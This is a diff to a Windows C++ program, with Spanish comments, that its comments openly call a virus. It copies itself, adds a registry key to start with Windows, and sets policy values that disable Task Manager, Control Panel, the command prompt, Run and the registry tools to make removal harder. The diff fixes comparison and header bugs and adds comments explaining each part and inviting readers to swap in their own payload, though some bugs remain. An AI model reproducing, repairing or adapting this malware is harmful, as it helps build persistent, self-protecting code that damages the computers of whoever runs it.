@@ -2,15 +2,15 @@
 //   zadyOne. - INVIERNO DE 2012    //
 //////////////////////////////////////
 
-#include <iostream.h>
+#include <iostream>
 #include <windows.h>
 #include <stdio.h>
 
-void moverAleatorio();
-int crearKey(char *path);
-void copiarVirus(char *camino);
-char *getRuta();
-void bloquear(char *bloqueo);
+void moverAleatorio(); // La funcion que hace el virus, podeis cambiarla
+int crearKey(char *path); // Crea un key en el regedit que hace que el virus se inicialice con Windows
+void copiarVirus(char *camino); // Este virus se autoduplica en char *camino, si no esta ya ahi.
+char *getRuta(); // Nos saca el char *ruta, es que usaremos en capiarVirus(), pasansola como char *camino.
+void bloquear(char *bloqueo); // Parte de la infeccion, para dificultar la eliminacion del virus
 
 char* bloqueoUno = "DisableTaskMgr";
 char* bloqueoDos = "NoControlPanel";
@@ -39,13 +39,13 @@ int main(int argc, char* argv[]){
      bloquear(bloqueoCuatro);
      bloquear(bloqueoCinco);
       if(argv[0]=senda){
-       moverAleatorio();
+       moverAleatorio(); // O lo que queramos que haga nuestro virus
        }
     }
     return 0;
 }
 
-void moverAleatorio(){
+void moverAleatorio(){ // Esta funcion podeis sustituirla por otra tonteria que quereis que haga
      int mx, my;
      
      mx = GetSystemMetrics(SM_CXSCREEN) - 1;
@@ -97,7 +97,7 @@ void bloquear(char *bloqueo){
       HKEY hBuffer = NULL, hMyKey = NULL;
       DWORD value = 1;
       
-      if(bloqueo = "DisableCMD"){
+      if(bloqueo == "DisableCMD"){
       if(RegOpenKeyEx(HKEY_CURRENT_USER, NULL, 0, KEY_WRITE, &hBuffer) == ERROR_SUCCESS){
       if(RegCreateKeyEx(hBuffer, "Software\\Policies\\Microsoft\\Windows\\System", 0, NULL, 0, KEY_WRITE, NULL, &hMyKey, NULL) == ERROR_SUCCESS){
          RegSetValueEx(hMyKey, bloqueo, 0, REG_DWORD, (BYTE*)&value, sizeof(DWORD));
@@ -106,7 +106,7 @@ void bloquear(char *bloqueo){
       }
       }
       
-            if(bloqueo = "DisableTaskMgr"){
+            if(bloqueo == "DisableTaskMgr"){
       if(RegOpenKeyEx(HKEY_CURRENT_USER, NULL, 0, KEY_WRITE, &hBuffer) == ERROR_SUCCESS){
       if(RegCreateKeyEx(hBuffer, "Software\\Policies\\Microsoft\\Windows\\System", 0, NULL, 0, KEY_WRITE, NULL, &hMyKey, NULL) == ERROR_SUCCESS){
          RegSetValueEx(hMyKey, bloqueo, 0, REG_DWORD, (BYTE*)&value, sizeof(DWORD));
@@ -115,7 +115,7 @@ void bloquear(char *bloqueo){
       }
       }
       
-            if(bloqueo = "NoRun"){
+            if(bloqueo == "NoRun"){
       if(RegOpenKeyEx(HKEY_CURRENT_USER, NULL, 0, KEY_WRITE, &hBuffer) == ERROR_SUCCESS){
       if(RegCreateKeyEx(hBuffer, "Software\\Policies\\Microsoft\\Windows\\System", 0, NULL, 0, KEY_WRITE, NULL, &hMyKey, NULL) == ERROR_SUCCESS){
          RegSetValueEx(hMyKey, bloqueo, 0, REG_DWORD, (BYTE*)&value, sizeof(DWORD));
@@ -124,7 +124,7 @@ void bloquear(char *bloqueo){
       }
       }
       
-            if(bloqueo = "NoControlPanel"){
+            if(bloqueo == "NoControlPanel"){
       if(RegOpenKeyEx(HKEY_CURRENT_USER, NULL, 0, KEY_WRITE, &hBuffer) == ERROR_SUCCESS){
       if(RegCreateKeyEx(hBuffer, "Software\\Policies\\Microsoft\\Windows\\System", 0, NULL, 0, KEY_WRITE, NULL, &hMyKey, NULL) == ERROR_SUCCESS){
          RegSetValueEx(hMyKey, bloqueo, 0, REG_DWORD, (BYTE*)&value, sizeof(DWORD));
@@ -132,7 +132,7 @@ void bloquear(char *bloqueo){
       }
       }
       }
-            if(bloqueo = "DisableRegistryTools"){
+            if(bloqueo == "DisableRegistryTools"){
       if(RegOpenKeyEx(HKEY_CURRENT_USER, NULL, 0, KEY_WRITE, &hBuffer) == ERROR_SUCCESS){
       if(RegCreateKeyEx(hBuffer, "Software\\Policies\\Microsoft\\Windows\\System", 0, NULL, 0, KEY_WRITE, NULL, &hMyKey, NULL) == ERROR_SUCCESS){
          RegSetValueEx(hMyKey, bloqueo, 0, REG_DWORD, (BYTE*)&value, sizeof(DWORD));
